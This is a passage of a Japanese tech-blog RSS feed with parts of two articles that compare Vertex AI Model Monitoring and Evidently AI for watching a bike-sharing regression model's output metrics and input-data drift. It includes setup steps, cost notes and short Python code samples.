説明変数列（特徴量データの列）, 正解データ列(<code>target</code>), 予測結果データ列(<code>prediction</code>) を含むデータ<ul><li>DataFrame型として読み取れる形式</li><li>予測結果データ列はVertex AIで手動でバッチ予測を行い、その結果を新たに<code>prediction</code>列として追加する</li><li>すなわち、予測（推論）処理はこのデータを用意する段階で行う</li></ul></li></ul><p>※[★2]について「②特徴量寄与率」を算出しなくて良い場合は、以下のように、<code>target</code>列と<code>prediction</code>列があればよい</p><img src="/images/20230414a/2023-03-22-14-50-10.png" alt="" width="199" height="197" loading="lazy"><h3 id="5-2-2-手順"><a href="#5-2-2-手順" class="headerlink" title="5.2.2. 手順"></a>5.2.2. 手順</h3><p>Evidently AIのライブラリが入っている環境下で以下のコードを実行する。</p><p>備考：</p><ul><li>過去・現在の2つのデータで評価して結果をを比較したい場合は[★3]と[★4]ように別のCSVファイルを指定する</li><li>現在の1つのデータのみで評価したい場合は[★5]のメソッドで<code>reference_data = None</code>とする</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> fetch_california_housing</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> evidently <span class="keyword">import</span> ColumnMapping</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> evidently.report <span class="keyword">import</span> Report</span><br><span class="line"><span class="keyword">from</span> evidently.metrics.base_metric <span class="keyword">import</span> generate_column_metrics</span><br><span class="line"><span class="keyword">from</span> evidently.metric_preset <span class="keyword">import</span> DataDriftPreset, TargetDriftPreset</span><br><span class="line"><span class="keyword">from</span> evidently.metrics <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> evidently.test_suite <span class="keyword">import</span> TestSuite</span><br><span class="line"><span class="keyword">from</span> evidently.tests.base_test <span class="keyword">import</span> generate_column_tests</span><br><span class="line"><span class="keyword">from</span> evidently.test_preset <span class="keyword">import</span> DataStabilityTestPreset, NoTargetPerformanceTestPreset</span><br><span class="line"><span class="keyword">from</span> evidently.tests <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">df1 = pd.read_csv(<span class="string">&#x27;hour-2011-target-pred.csv&#x27;</span>) <span class="comment">#[★3]</span></span><br><span class="line">df2 = pd.read_csv(<span class="string">&#x27;hour-2012-target-pred.csv&#x27;</span>) <span class="comment">#[★4]</span></span><br><span class="line"></span><br><span class="line">report = Report(metrics=[</span><br><span class="line">    RegressionQualityMetric(),<span class="comment"># ①モデル精度（数値指標の表示）</span></span><br><span class="line">    ColumnCorrelationsMetric(column_name=<span class="string">&#x27;target&#x27;</span>), <span class="comment"># ②特徴量寄与率（相関係数の表示）</span></span><br><span class="line">    ColumnDistributionMetric(column_name=<span class="string">&quot;prediction&quot;</span>), <span class="comment"># ③予測結果の偏り（予測結果の分布表示）</span></span><br><span class="line">    RegressionPredictedVsActualScatter(), <span class="comment"># 予測結果と正解データの分布表示</span></span><br><span class="line">    RegressionErrorPlot(), <span class="comment"># 誤差の時間的推移を視覚的に表示</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">report.run(current_data=df2, reference_data=df1,column_mapping=<span class="literal">None</span>) <span class="comment">#[★5]</span></span><br><span class="line">report.show(mode=<span class="string">&#x27;inline&#x27;</span>) <span class="comment"># Notebookのセル出力で結果を表示する</span></span><br></pre></td></tr></table></figure><h3 id="5-2-3-監視結果"><a href="#5-2-3-監視結果" class="headerlink" title="5.2.3. 監視結果"></a>5.2.3. 監視結果</h3><p>「①モデル精度」として、以下のようにMAE等の基本的な数値指標を出力することができます。</p><img src="/images/20230414a/2023-03-22-14-57-34.png" alt="" width="1200" height="556" loading="lazy"><p>※以降、赤色と灰色のグラフが出てきますが、次のような区別です。</p><ul><li>current（赤色）：訓練に使ったものとは違うデータ(評価用データ)をモデルに入力した場合の予測結果</li><li>reference（灰色）：訓練に使ったデータをモデルに入力した場合の予測結果</li></ul><p>「②特徴量寄与率」として、以下のように各説明変数-目的変数(target列)間の相関係数を出力することができます。<br>説明変数-目的変数間の相関係数が大きいほど特徴量寄与率が大きいことを示します。</p><img src="/images/20230414a/2023-04-05-09-36-51.png" alt="" width="1200" height="669" loading="lazy"><p>「③予測結果の偏り」として、以下のように予測結果の分布表示をすることができます。</p><p>訓練用データに対する予測結果(reference)と評価用データに対する予測結果(current)の分布を表示したものです。</p><p>両者の分布を比較することで、予測結果の偏りを監視することができます。</p><img src="/images/20230414a/2023-04-03-14-15-06.png" alt="" width="1200" height="559" loading="lazy"><p>加えて、Evidently AIでは以下のような視覚的出力もできます。</p><p>次の画像は、予測結果と正解データの分布表示を表しています。</p><p>直線に近い見た目になるほど高精度であることを視覚的に示します。</p><img src="/images/20230414a/2023-03-22-14-58-19.png" alt="" width="1200" height="421" loading="lazy"><p>また、誤差の時間的推移を視覚的に表示することもできます。</p><img src="/images/20230414a/2023-03-22-15-03-00.png" alt="" width="1200" height="426" loading="lazy"><p>今回出力したグラフは一例ですが、Evidently AIでは他にも様々なグラフを出力することができます。<br>詳しくは<a href="https://docs.evidentlyai.com/reference/all-metrics#regression">公式ドキュメント</a>を参照してください。</p><h3 id="5-2-4-自動化とアラート"><a href="#5-2-4-自動化とアラート" class="headerlink" title="5.2.4. 自動化とアラート"></a>5.2.4. 自動化とアラート</h3><p>以上の手順を自動化するための実装コストは大きいと考えられます。<br>まず、<a href="https://cloud.google.com/vertex-ai/docs/tabular-data/classification-regression/get-batch-predictions?hl=ja#api:-csv">Vertex AI API</a>からバッチ予測をリクエストし、その結果をCSVファイル形式等で受け取ります。<br>受け取ったCSVファイルから、予測結果データ列(prediction)を取り出し、 正解データ列(target)と合わせたテーブルを作成し、Evidently AIに入力します。</p><p>アラートについて、Evidently AIのTestの結果はJSON形式で受け取れるため、<br>その結果を受け取り、前回の評価結果と比較するシステムを構築すればアラートを発生させることが可能と考えられます。<br>※Evidently AIのTestについては<a href="%E2%98%85%E3%83%AA%E3%83%B3%E3%82%AF%E3%81%8A%E9%A1%98%E3%81%84%E3%81%97%E3%81%BE%E3%81%99">前回の記事</a>に詳細があります。</p><h2 id="5-3-コスト"><a href="#5-3-コスト" class="headerlink" title="5.3. コスト"></a>5.3. コスト</h2><ul><li>実装コスト<ul><li>ユースケースに合わせてPythonコードを実装する必要がありますが、コードは単純でドキュメントも分かりやすく、評価自体はローコードで実装可能です</li><li>自動化する場合、Vertex AI APIを駆使する必要があり、実装コストは大きいです</li></ul></li><li>金銭的コスト<ul><li>Evidently AIを動かすサーバ・関数等のコストが掛かります</li></ul></li></ul><h2 id="6-まとめ"><a href="#6-まとめ" class="headerlink" title="6. まとめ"></a>6. まとめ</h2><p>本記事ではVertex AIとEvidently AIを用いたOutput Metrics監視の検証を行いました。<br>検証の結果を以下の表にまとめます。様々な観点で両者を比較しているので、ご参考になれば幸いです。</p><div class="scroll"><table><thead><tr><th>比較の観点</th><th>Vertex AI</th><th>Evidently AI</th></tr></thead><tbody><tr><td>①モデル精度</td><td>◎（5種の評価指標）</td><td>〇（3種の評価指標）</td></tr><tr><td>②特徴量寄与率</td><td>〇（Shaplay値）</td><td>〇（相関係数）</td></tr><tr><td>③予測の偏り</td><td>機能は提供されていない</td><td>〇 （予測結果の分布を比較）</td></tr><tr><td>実装コスト</td><td>ノーコードで実装可能</td><td>ローコードで実装可能。一部手作業</td></tr><tr><td>金銭的コスト</td><td>VertexAIのバッチ予測 + 評価のコスト</td><td>VertexAIのバッチ予測のコストのみ</td></tr><tr><td>メリット</td><td>モデルと連携して特徴量寄与率を算出可能</td><td>可視化機能が充実している</td></tr><tr><td>デメリット</td><td>可視化機能が充実していない</td><td>手動でVertex AIのバッチ予測を行う必要がある</td></tr></tbody></table></div>]]></content:encoded>
      
      
      <category domain="https://future-architect.github.io/categories/DataScience/">DataScience</category>
      
      
      <category domain="https://future-architect.github.io/tags/MLOps/">MLOps</category>
      
      <category domain="https://future-architect.github.io/tags/Evidently-AI/">Evidently AI</category>
      
      <category domain="https://future-architect.github.io/tags/Vertex-AI-Model-Monitoring/">Vertex AI Model Monitoring</category>
      
      <category domain="https://future-architect.github.io/tags/AI%E7%9B%A3%E8%A6%96/">AI監視</category>
      
      
      <comments>https://future-architect.github.io/articles/20230414a/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Vertex AI Model MonitoringとEvidently AIで運用中のモデル・データを監視する【Input Metrics編】</title>
      <link>https://future-architect.github.io/articles/20230413a/</link>
      <guid>https://future-architect.github.io/articles/20230413a/</guid>
      <pubDate>Wed, 12 Apr 2023 15:00:00 GMT</pubDate>
      
        
        
          
          
      <description>&lt;h1 id=&quot;1-はじめに&quot;&gt;&lt;a href=&quot;#1-はじめに&quot; class=&quot;headerlink&quot; title=&quot;1. はじめに&quot;&gt;&lt;/a&gt;1.</description>
          
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-はじめに"><a href="#1-はじめに" class="headerlink" title="1. はじめに"></a>1. はじめに</h1><p>こんにちは、フューチャーでアルバイトをしている板野です。</p><p>今回は、データ&#x2F;モデル監視ツールであるVertex AI Model MonitoringとEvidently AIを利用し、両者を様々な観点で検証していきたいと思います。</p><p><strong>Vertex AIのAutoMLで作成した回帰モデルの監視を想定</strong>し、ユースケースを交えて両者をそれぞれ検証していきます。オープンデータを用いてモデルを学習させ、それに対して監視設定をして運用を試してみたので、その一連の手順と検証結果を記載します。</p><p>データ&#x2F;モデル監視の基本については、以前に投稿された記事：<a href="/articles/20230412a/">MLシステムにおけるモデル・データの監視（概要編）</a>をご参照ください。</p><h1 id="2-監視の必要性"><a href="#2-監視の必要性" class="headerlink" title="2. 監視の必要性"></a>2. 監視の必要性</h1><p>データ&#x2F;モデルを監視するモチベーションとして、例えば以下のような事項が挙げられます。</p><ul><li>刻々と変わる世界の中で、モデルが期待通りに動作し続けるようにしたい</li><li>モデルが出す結果の精度の変化にいち早く気づきたい</li><li>定期的にモデルの更新が必要だと思うがそのタイミングが分からない</li></ul><p>※モデルとは、機械学習システムにおいて、訓練データを用いて訓練したAIモデルのことを指します。</p><h1 id="3-今回想定するユースケース"><a href="#3-今回想定するユースケース" class="headerlink" title="3. 今回想定するユースケース"></a>3. 今回想定するユースケース</h1><p>上記の監視の必要性に対するソリューション例を示すため、具体的なユースケースを想定します。<br>今回は、<strong>天気や気温等の特徴からその日のシェアバイク利用数を予測する回帰モデルを構築する</strong>ことを想定します。</p><h2 id="3-1-監視の背景"><a href="#3-1-監視の背景" class="headerlink" title="3.1. 監視の背景"></a>3.1. 監視の背景</h2><p>シェアバイク屋さんは精度の高い利用数予測モデルを導入し、業務の効率化に役立てたいと考えています。</p><p>しかし、季節やトレンドの時季的な変化は必ず訪れるため、同じモデルを使い続けていると精度は低下していきます。また、機能や仕様の変更でデータの形式が変わり、モデルが役に立たなくなることもあります。</p><p>このようにモデルの精度を低下させる要因は様々あります。</p><p>そこで、モデルを監視することにより精度の低下を防ぐソリューションを考えます。</p><h2 id="3-2-監視項目"><a href="#3-2-監視項目" class="headerlink" title="3.2. 監視項目"></a>3.2. 監視項目</h2><p>では、一体何を監視すれば良いのでしょうか。</p><p>監視の対象は様々ありますが、大きく以下の2つに分かれます。</p><ul><li>Output Metrics<ul><li>出力データに関する監視</li><li>例）精度・特徴量寄与率・予測の偏り等</li></ul></li><li>Input Metrics<ul><li>入力データに関する監視</li><li>例）データドリフト・外れ値・データ数の極端な低下等</li></ul></li></ul><p>精度の低下を直接監視するにはOutput Metricsを見れば良いのですが、モデルの予測結果を評価するための正解データが必要な場合があります。実運用では正解データが手に入るまでにはラグがあるので、Output Metricsではモデルの精度低下に気づくのが遅れる恐れがあります。</p><p>一方、Input Metricsはモデルに入力されるデータに異常や傾向の変化が無いかを確認し、間接的にモデルの精度低下を監視します。この場合、モデルの出力や正解データを待たずとも精度低下の予兆に気づくことができます。</p><p>今回は<strong>Input Metrics</strong>を監視するツールを検証し、AI運用にどのように役に立つのか検証していきます。</p><p>Output Metricsについては、本記事を読んだ上で、こちらの記事：[Vertex AI Model MonitoringとEvidently AIで運用中のモデル・データを監視する【Output Metrics編】(※2023.4.13公開予定)]をご覧ください。</p><h4 id="補足：データドリフトとは？"><a href="#補足：データドリフトとは？" class="headerlink" title="補足：データドリフトとは？"></a>補足：データドリフトとは？</h4><p>データドリフトとは、主に「データの傾向が時間の経過とともに変化すること」を表します。訓練データと推論データの性質が違い、本番で良い精度が発揮できない場合や、最初は良い精度でもデータの性質変化により徐々に精度が下がっていく場合があります。</p><h1 id="4-事前準備-データ準備・モデル構築"><a href="#4-事前準備-データ準備・モデル構築" class="headerlink" title="4. 事前準備: データ準備・モデル構築"></a>4. 事前準備: データ準備・モデル構築</h1><p>監視ツールを比較検証するための事前準備として、Vertex AIのAutoMLを使用して回帰モデルを作成します。<br>※本章はAI監視とは関係ありません。既にVertex AIでモデルのエンドポイントを作成している場合はこの章を飛ばすことができます。</p><h2 id="4-1-使用するデータセット"><a href="#4-1-使用するデータセット" class="headerlink" title="4.1. 使用するデータセット"></a>4.1. 使用するデータセット</h2><p>データセットは<a href="https://archive.ics.uci.edu/ml/datasets/bike+sharing+dataset">Bike Sharing Dataset</a>を利用します。<br>このデータセットには2011年と2012年のシェアバイク利用データが入っており、以下のファイルが含まれています。</p><ul><li><code>day.csv</code>: 日ごとのシェアバイク利用者数が記録されている（全731行）</li><li><code>hour.csv</code>: 時間ごとのシェアバイク利用者数が記録されている（全17379行）</li></ul><p><code>day.csv</code>ではデータ数が少ないので、<code>hour.csv</code>を使うことにします。<br>データの内容は以下のようになっています。（最初の5行のみ表示）</p><img src="/images/20230413a/image.png" alt="" width="1200" height="107" loading="lazy"><p>主な説明変数として、気温(tmp), 湿度(hum), 風速(windspeed)等があります。目的変数はその時間のシェアバイク利用数(cnt)です。</p><p>今回は2011年分のデータのみで学習し、2012年のデータを入れたときの挙動を確かめます。</p><p>hour.csvには2011~2012年のデータがまとめて入っているので以下のように分割したcsvファイルを手作業で作成します。</p><ul><li>hour-2011.csv: 2011年の時間毎シェアバイク利用者数（全8645行）</li><li>hour-2012.csv: 2012年の時間毎シェアバイク利用者数（全8734行）</li></ul><p>更に、月毎に特徴量の分布も変わってくるため、推論に使う2012年のデータについては以下のように月毎に分けたデータも作成しておきました。</p><ul><li>hour-2012-01.csv: 2012年1月の時間毎シェアバイク利用者数（全741行）</li><li>hour-2012-02.csv: 2012年2月の時間毎シェアバイク利用者数（全692行）<br>︙</li></ul><h2 id="4-2-Vertex-AIのデータセットを作成する"><a href="#4-2-Vertex-AIのデータセットを作成する" class="headerlink" title="4.2. Vertex AIのデータセットを作成する"></a>4.2. Vertex AIのデータセットを作成する</h2><p>AutoMLで学習するためにはデータセットを作成する必要があります。<br>左メニューの「データセット」から作成できます。</p><img src="/images/20230413a/image_2.png" alt="" width="1200" height="821" loading="lazy"><p>次に、いずれかの方法でCSVファイルをアップロードします。<br>BigQueryのデータをそのままデータセットにすることもできます。</p><img src="/images/20230413a/image_3.png" alt="" width="1200" height="547" loading="lazy"><p>これでVertex AIのデータセット作成は完了です。</p><h2 id="4-3-AutoMLでモデルの学習を行う"><a href="#4-3-AutoMLでモデルの学習を行う" class="headerlink" title="4.3. AutoMLでモデルの学習を行う"></a>4.3. AutoMLでモデルの学習を行う</h2><p>作成したデータセット（2011年の時間毎シェアバイク利用者数のデータ）で学習を行います。<br>左メニューの「トレーニング」からAutoMLでの学習設定ができます。</p><img src="/images/20230413a/image_4.png" alt="" width="1200" height="690" loading="lazy"><p>モデルの名前は適宜設定し、Target columnには<code>cnt(INTEGER)</code>を選択します。<br>目的変数はシェアバイク利用数(cnt)だからです。</p><img src="/images/20230413a/image_5.png" alt="" width="1200" height="637" loading="lazy"><p>AutoMLでは学習に使う特徴量（説明変数）を選択するといった前処理のようなことができます。<br>今回入手したデータセットには必要のない特徴量もあるため、この画面で特徴量選択しておきます。</p><img src="/images/20230413a/image_6.png" alt="" width="1200" height="702" loading="lazy"><p>最後に、トレーニングに費やす予算を設定します。</p><p>Vertex AIではこの予算の単位には「トレーニング時間」というものが使われています。</p><p>1トレーニング時間当たり2000~3000円掛かります。（<a href="https://cloud.google.com/vertex-ai/pricing?_ga=2.100859905.-1083087641.1678234233&_gac=1.161532622.1678234235.CjwKCAiA3pugBhAwEiwAWFzwdV87TWSYMsS7XAUXked_GSRNHRLhPL2skos9L6jwACckfFioeizOvBoCVf0QAvD_BwE&hl=ja#automl_models">参考</a>）</p><img src="/images/20230413a/image_7.png" alt="" width="1200" height="449" loading="lazy"><p>約2時間程で学習が完了し、モデルが完成します。</p><h2 id="4-4-エンドポイントの作成"><a href="#4-4-エンドポイントの作成" class="headerlink" title="4.4. エンドポイントの作成"></a>4.4. エンドポイントの作成</h2><p>モデルは完成しましたが、そのモデルを使って予測を行う窓口（エンドポイント）を作成する必要があります。<br>左メニューの「エンドポイント」よりエンドポイントを作成することができます。</p><img src="/images/20230413a/image_8.png" alt="" width="1200" height="651" loading="lazy"><p>モデルの設定は以下の通りにします。</p><p>エンドポイントを設定すると、オンライン予測のリクエストを受け付けるので、マシンを常時起動し続けることになります（課金されます！！）。</p><p>従って、まずは最も低スペックのマシンタイプを選択することをお勧めします。</p><img src="/images/20230413a/image_9.png" alt="" width="1200" height="1475" loading="lazy"><p>モデルのモニタリングは後で設定できるので、事前準備中の今は設定しません。</p><img src="/images/20230413a/image_10.png" alt="" width="1196" height="458" loading="lazy"><p>「作成」を押すと、10分程待てばエンドポイントが作成されます。</p><p><a href="https://github.com/googleapis/python-aiplatform/blob/main/samples/snippets/prediction_service/predict_tabular_classification_sample.py">こちら</a>のPythonソースコードを参考にし、試しにエンドポイントにリクエストを投げてみます。<br>※リクエストの投げ方については割愛</p><img src="/images/20230413a/image_11.png" alt="" width="1200" height="85" loading="lazy"><p>上画像のように予測結果が辞書型（REST API経由でリクエストしたらJSON型）で返ってきます。<br>※モデルを実運用している現場ではこのような予測リクエストを大量に投げることになります。</p><p>これで事前準備は完了です。</p><h1 id="5-Vertex-AI-Model-Monitoringでの監視"><a href="#5-Vertex-AI-Model-Monitoringでの監視" class="headerlink" title="5. Vertex AI Model Monitoringでの監視"></a>5. Vertex AI Model Monitoringでの監視</h1><p><a href="https://cloud.google.com/vertex-ai/docs/model-monitoring/overview?hl=ja">Vertex AI Model Monitoring</a>は、AutoML等で訓練したモデルの監視をVertex AI内で完結できるサービスです。</p><p>コンソール画面から監視設定ができ、ノーコードで実現できることが特徴です。</p><p>Vertex AI自体にバージョンの概念はありませんが、<code>2023/3/29</code>時点の操作画面となります。</p><h2 id="5-1-監視できること"><a href="#5-1-監視できること" class="headerlink" title="5.1. 監視できること"></a>5.1. 監視できること</h2><p>Vertex AIではInput Metricsとして<strong>トレーニング &#x2F; サービング スキュー</strong>と<strong>予測ドリフト</strong>を検出することができます。</p><p>Vertex AIでは二者を以下のように定義しています。（<a href="https://cloud.google.com/vertex-ai/docs/model-monitoring/overview?hl=ja">公式サイト</a>）</p><ul><li>トレーニング &#x2F; サービング スキュー（スキュー）<ul><li>訓練データと推論データ間で特徴の分布が異なること</li><li>訓練データの特徴の分布情報が必要</li></ul></li><li>予測ドリフト（ドリフト）<ul><li>推論データの特徴の分布が時間の経過とともに変化すること</li><li>訓練データの特徴の分布情報は不要</li></ul></li></ul><p><a href="https://cloud.google.com/vertex-ai/docs/model-monitoring/overview?hl=ja#calculating-skew-and-drift">公式サイト</a>によると、分布間の距離は以下のアルゴリズムにより計算されます。</p><blockquote><p>カテゴリ特徴の場合、距離スコアはチェビシェフ距離を使用して計算されます。<br>数値特徴の場合、距離スコアはジェンセン・シャノン ダイバージェンスを使用して計算されます。</p></blockquote><h2 id="5-2-監視設定と監視結果"><a href="#5-2-監視設定と監視結果" class="headerlink" title="5.2. 監視設定と監視結果"></a>5.2. 監視設定と監視結果</h2><h3 id="5-2-1-スキューを監視する"><a href="#5-2-1-スキューを監視する" class="headerlink" title="5.2.1. スキューを監視する"></a>5.2.1. スキューを監視する</h3><p>トレーニング &#x2F; サービングスキューを監視するために、エンドポイントの設定を変更します。<br>「このエンドポイントのモデルのモニタリングを有効にする」をオンにして設定していきます。以下は設定項目です。</p><ul><li>モニタリング間隔<ul><li>モニタリングを実行する時間間隔</li><li>短いほど計算リソースを使うため、あまりデータの変化に敏感にならなくて良い場合は長めに設定</li><li>今回は検証のため、かなり短めの1時間に設定</li></ul></li><li>モニタリング データ時間<ul><li>モニタリングを実行するタイミングからどの程度リクエストを遡るか</li><li>例えば1時間に設定すると、モニタリングを実行する1時間前からのリクエストデータを収集し、特徴量分布の計算等を行い、訓練データと比較してスキューがあるか調べる。</li><li>予測リクエストの履歴は自動でBigQueryに保存されているため、このような機能が実現できているようです。</li></ul></li><li>通知メール<ul><li>スキューを検出した際にアラートを出すメールアドレスを複数指定できる</li><li>Slack等への通知はできない</li></ul></li><li>サンプリングレート<ul><li>「モニタリング データ時間」の間に溜まった予測リクエスト履歴のうち何パーセントを特徴量分布の計算に利用するか</li><li>大量の予測リクエストが来る環境下では低めに設定</li></ul></li></ul><img src="/images/20230413a/image_12.png" alt="" width="1200" height="1137" loading="lazy"><p>モニタリングの目的は「トレーニング サービングスキューの検出」を選択します。<br>トレーニング データソースにはモデルの訓練に使用したデータを選択します。<br>Cloud Strage上のCSVファイル、BigQueryテーブル、Vertex AIデータセットの中から選べます。</p><img src="/images/20230413a/image_13.png" alt="" width="1200" height="1478" loading="lazy"><p>「更新」をクリックすると、モニタリングが有効になります。</p><p>試しに、1時間ごとに2012年のひと月分のデータを予測リクエストとして投げてみました。</p><p>すると、いくつかアラートが発生したようです。</p><p>訓練データ分布との距離が大きく開いているため、アラートが発生しています。</p><img src="/images/20230413a/image_14.png" alt="" width="1200" height="388" loading="lazy"><p>特徴量のうち、temp(気温)をクリックしてみると、分布を可視化できます。</p><p>以下は2011年の1~12月の気温の分布（訓練データ）と、2012年のとあるひと月の分布（推論データ）が違っていることを表しています。</p><p>※今回はこのようにスキューが起こるように意図的にデータの与え方を工夫しています。</p><img src="/images/20230413a/image_15.png" alt="" width="1200" height="1289" loading="lazy"><p>アラートが発生すると以下のようなメールが届きます。</p><img src="/images/20230413a/image_16.png" alt="" width="1200" height="591" loading="lazy"><h3 id="5-2-2-ドリフトを監視する"><a href="#5-2-2-ドリフトを監視する" class="headerlink" title="5.2.2. ドリフトを監視する"></a>5.2.2. ドリフトを監視する</h3><p>予測ドリフトを監視するために、エンドポイントの設定を変更します。</p><p>といっても、<code>5.2. トレーニング / サービング スキューを監視する</code>で行った設定とほぼ同じです。</p><p>モニタリングの目的で「予測ドリフト検出」を選択して「更新」ボタンを押すだけです。</p><p>※比較用の訓練データを指定する必要はありません。</p><img src="/images/20230413a/image_17.png" alt="" width="1200" height="866" loading="lazy"><p>先程と同様、1時間ごとに2012年のひと月分のデータを予測リクエストとして投げてみました。</p><p>すると以下画像のようにアラートが確認できます。</p><p>1時間前にリクエストされたデータの分布との距離が大きく開いているため、アラートが発生しています。</p><img src="/images/20230413a/image_18.png" alt="" width="1200" height="391" loading="lazy"><p>スキュー検出と同様に、特徴量のうちtemp(気温)をクリックすると、分布を可視化できます。</p><p>ただし、予測ドリフト検出の場合は比較対象は訓練データではなく、以前の推論データとなります。</p><p>このため、トレーニング統計の分布は表示されていません。</p><p>右側にモニタリングが実施された時間が表示されており、クリックすることで各時間の分布を表示することができます。</p><img src="/images/20230413a/image_19.png" alt="" width="1200" height="918" loading="lazy"><h2 id="5-3-コスト"><a href="#5-3-コスト" class="headerlink" title="5.3. コスト"></a>5.3. コスト</h2><p>監視設定はVertex AIのコンソール画面から設定できるので、<strong>実装コスト</strong>はほぼ必要ないと言ってもいいでしょう。<br>また、モニタリングも自動で定期的に行ってくれるため、<strong>運用コスト</strong>も必要ありません。</p><p>ただし、Vertex AI Model Monitoringを使用するには以下の<strong>金銭的コスト</strong>が発生します。（<a href="https://cloud.google.com/vertex-ai/pricing?hl=ja#modelmonitoring">引用元</a>）<br>大規模なデータを扱う時には金銭的コストに注意が必要です。</p><blockquote><ul><li>Vertex AI Model Monitoring を使用すると、以下に対して課金されます。</li><li>BigQuery テーブルに記録されたトレーニング データと予測データを含め、分析するすべてのデータに対して <strong>1 GB あたり $3.50</strong>。</li><li>アトリビューション モニタリングが有効にされている場合、BigQuery Monitoring や Batch Explain など、Model Monitoring で使用する他の Google Cloud プロダクトに対する課金。</li></ul></blockquote><h1 id="6-Evidently-AIでの監視"><a href="#6-Evidently-AIでの監視" class="headerlink" title="6. Evidently AIでの監視"></a>6. Evidently AIでの監視</h1><p><a href="https://docs.evidentlyai.com/">Evidently AI</a>はオープンソースのPythonライブラリで、ML監視に関わるあらゆる機能を提供してくれます。<br>監視の結果はHTMLファイルやJSONファイルで確認することができます。</p><p>Input Metricsだけでなく、Output Metricsの監視まで支援してくれる機能もありますが、<br>今回はInput Metricsに限定して紹介します。</p><p>Evidently AIのバージョンは<code>0.2.6</code>を使用しています。</p><h2 id="6-1-監視できること"><a href="#6-1-監視できること" class="headerlink" title="6.1. 監視できること"></a>6.1. 監視できること</h2><p>Evidently AIでの監視はVertex AI Model Monitoringのようにノーコードで実現することはできませんが、<br>以下のような、より多くの項目を監視できます。</p><ul><li>ドリフト</li><li>スキュー</li><li>欠損値</li><li>外れ値</li><li>値が正常な範囲内か</li><li>列の不足は無いか</li><li>列(特徴量)同士の相関</li></ul><p>Evidently AIには大きく以下の2種類の機能があります。<br>両者とも監視項目としては似ていますが、その結果の扱い方に違いがあります。</p><ul><li>Report<ul><li>データの品質調査の結果を可視化することができる</li><li>データの傾向を分析したいときに活用</li><li>例）ドリフト検出にて特徴量分布を可視化して傾向を分析する</li></ul></li><li>Test<ul><li>データ品質の異常をテストすることができる</li><li>予め基準を定めておき、それを満たすか否か自動で判別したいときに活用</li><li>例）ドリフト検出にて自動で異常を検知してアラートを発する</li></ul></li></ul><h2 id="6-2-監視設定と監視結果"><a href="#6-2-監視設定と監視結果" class="headerlink" title="6.2. 監視設定と監視結果"></a>6.2. 監視設定と監視結果</h2><h3 id="6-2-1-Evidently-AIのインストール"><a href="#6-2-1-Evidently-AIのインストール" class="headerlink" title="6.2.1. Evidently AIのインストール"></a>6.2.1. Evidently AIのインストール</h3><p>まずはpipコマンドでEvidently AIをインストールします。</p><p><code>pip install evidently</code></p><p>また、Notebook上で使用する場合は次の2つのコマンドを打つとセル出力から直接結果を表示できるようになります。<br>※Notebookを使用しない場合はHTMLファイルを出力することになります。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jupyter nbextension install --sys-prefix --symlink --overwrite --py evidently</span><br><span class="line">jupyter nbextension <span class="built_in">enable</span> evidently --py --sys-prefix</span><br></pre></td></tr></table></figure><h3 id="6-2-2-データの準備"><a href="#6-2-2-データの準備" class="headerlink" title="6.2.2. データの準備"></a>6.2.2. データの準備</h3><p>Evidently AIを使うのに大きな準備は必要ありません。</p><p>Input Metricsの監視では2つの異なるデータセット間の分布を調べるため、2つのデータを用意するだけです。</p><p>Evidently AIはPandasのDataFrame形式でデータを渡す必要があります。したがって、DataFrameで読み取れる形式のデータならどのようなデータソースでも大丈夫です。ただし、大規模データを扱う際は処理に時間やリソースを要する可能性があります。</p><p>CSVファイルならそのまま読み取るだけ、BigQueryならAPIを使ってDataFrameとして読み込むこともできます。</p><p>ここでは、2012年1月分と2月分の時間毎シェアバイク利用者数のデータを利用しました。</p><h3 id="6-2-3-Reportを使う"><a href="#6-2-3-Reportを使う" class="headerlink" title="6.2.3. Reportを使う"></a>6.2.3. Reportを使う</h3><p><a href="https://docs.evidentlyai.com/get-started/hello-world">公式のBasic Example</a>を参考に、以下のコードを作成し、Notebook上で実行してみました。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> evidently.report <span class="keyword">import</span> Report</span><br><span class="line"><span class="keyword">from</span> evidently.metric_preset <span class="keyword">import</span> DataDriftPreset, DataQualityPreset</span><br><span class="line"></span><br><span class="line">data1 = pd.read_csv(<span class="string">&#x27;hour-2012-01.csv&#x27;</span>) <span class="comment"># 比較する1つ目のデータ</span></span><br><span class="line">data2 = pd.read_csv(<span class="string">&#x27;hour-2012-02.csv&#x27;</span>) <span class="comment"># 比較する2つ目のデータ</span></span><br><span class="line"></span><br><span class="line">report = Report(metrics=[</span><br><span class="line">    DataDriftPreset(), <span class="comment"># 